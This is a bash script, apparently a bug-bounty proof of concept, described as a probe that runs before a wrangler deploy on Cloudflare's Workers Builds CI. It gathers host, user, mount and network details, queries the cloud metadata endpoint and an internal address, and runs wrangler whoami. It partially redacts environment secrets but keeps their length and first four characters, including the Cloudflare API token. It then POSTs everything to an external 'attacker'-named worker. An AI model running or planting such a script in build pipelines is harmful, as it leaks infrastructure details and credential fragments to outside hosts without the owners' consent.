#!/bin/bash
# Workers Builds runner environment probe
# Runs BEFORE wrangler deploy on Cloudflare's CI infrastructure
# Exfiltrates (redacted) env to researcher-owned logging worker

LOG_URL="https://cf-mcp-xss-attacker.mohammadmseet-h1-proof.workers.dev/x"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Redact sensitive values: replace token/key values with placeholder
redact_env() {
  printenv | sort | while IFS='=' read -r key value; do
    case "$key" in
      *TOKEN*|*KEY*|*SECRET*|*PASSWORD*|*PASS*|*CREDENTIAL*)
        len=${#value}
        first4=${value:0:4}
        echo "${key}=<REDACTED_LEN=${len}_FIRST4=${first4}>"
        ;;
      *)
        echo "${key}=${value}"
        ;;
    esac
  done
}

UNAME=$(uname -a)
OS_RELEASE=$(cat /etc/os-release 2>/dev/null | tr '\n' '|')
CGROUP=$(cat /proc/self/cgroup 2>/dev/null | tr '\n' '|')
PROC_STATUS=$(cat /proc/self/status 2>/dev/null | head -40 | tr '\n' '|')
HOSTNAME_OUT=$(hostname -f 2>/dev/null || hostname)
WHOAMI_OUT=$(id)

# Redacted env vars
ENV_REDACTED=$(redact_env | base64 -w0 2>/dev/null || redact_env | base64)

# Gather filesystem info
DF_OUT=$(df -h 2>/dev/null | tr '\n' '|')
MOUNTS=$(mount 2>/dev/null | head -20 | tr '\n' '|')

# Network reachability tests
METADATA_169=$(curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 | tr '\n' '|' || echo 'no-response')
CF_INTERNAL=$(curl -s --max-time 3 http://169.254.1.1/ 2>/dev/null | head -2 | tr '\n' '|' || echo 'no-response')
NET_CONFIG=$(ip addr 2>/dev/null | tr '\n' '|' || ifconfig 2>/dev/null | head -20 | tr '\n' '|' || echo 'no-ip-cmd')

# Wrangler identity - shows what account the injected token belongs to
WRANGLER_WHO=$(npx wrangler@latest whoami 2>&1 | tr '\n' '|' || true)

# Build JSON payload
PAYLOAD=$(python3 -c "
import json, base64, os, sys

data = {
    'source': 'workers-builds-native',
    'timestamp': os.environ.get('TIMESTAMP', ''),
    'uname': '''${UNAME}''',
    'hostname': '''${HOSTNAME_OUT}''',
    'whoami': '''${WHOAMI_OUT}''',
    'os_release': '''${OS_RELEASE}''',
    'cgroup': '''${CGROUP}''',
    'proc_status': '''${PROC_STATUS}''',
    'df': '''${DF_OUT}''',
    'mounts': '''${MOUNTS}''',
    'metadata_169_test': '''${METADATA_169}''',
    'cf_internal_test': '''${CF_INTERNAL}''',
    'net_config': '''${NET_CONFIG}''',
    'wrangler_whoami': '''${WRANGLER_WHO}''',
    'env_redacted_b64': '${ENV_REDACTED}',
    'wrangler_ci_match_tag': os.environ.get('WRANGLER_CI_MATCH_TAG', ''),
    'wrangler_ci_override_name': os.environ.get('WRANGLER_CI_OVERRIDE_NAME', ''),
    'workers_ci_branch': os.environ.get('WORKERS_CI_BRANCH', ''),
    'workers_ci_generate_preview_alias': os.environ.get('WRANGLER_CI_GENERATE_PREVIEW_ALIAS', ''),
    'cf_account_id': os.environ.get('CLOUDFLARE_ACCOUNT_ID', ''),
    'cf_api_token_redacted': '<REDACTED_LEN=' + str(len(os.environ.get('CLOUDFLARE_API_TOKEN', ''))) + '_FIRST4=' + os.environ.get('CLOUDFLARE_API_TOKEN', '')[:4] + '>',
}
print(json.dumps(data))
" 2>/dev/null || echo '{"source":"workers-builds-native","error":"json-build-failed"}')

curl -s -X POST "${LOG_URL}?d=workers-builds-native-v4" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" || true

echo "[probe-env.sh] Env probe complete at ${TIMESTAMP}"
